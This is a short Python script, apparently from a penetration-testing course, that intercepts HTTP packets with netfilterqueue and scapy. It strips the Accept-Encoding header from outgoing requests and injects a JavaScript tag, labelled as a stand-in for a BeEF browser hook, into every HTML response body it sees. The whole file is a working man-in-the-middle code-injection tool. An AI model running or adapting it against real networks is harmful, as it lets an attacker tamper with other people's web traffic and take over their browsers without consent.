#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Delete fields that need to be recalculated, let scapy fill them
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):

        load = scapy_packet[scapy.Raw].load

        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")

            #  Regex: Accept-Encoding:.*?\\r\\n
            #  take "Accept-Encoding", ".*" any type & number of characters, "?\\r\\n" stop at first occurrence '\r\n'
            #  Accept-Encoding:.*?\\r\\n
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # Replace occurrence that change data format

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            load = load.replace("<body>", "<body><script>alert('This could be a Beef Hook');</script>")

        # Set packet if his load has been modified
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))  # Set the modified packet

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
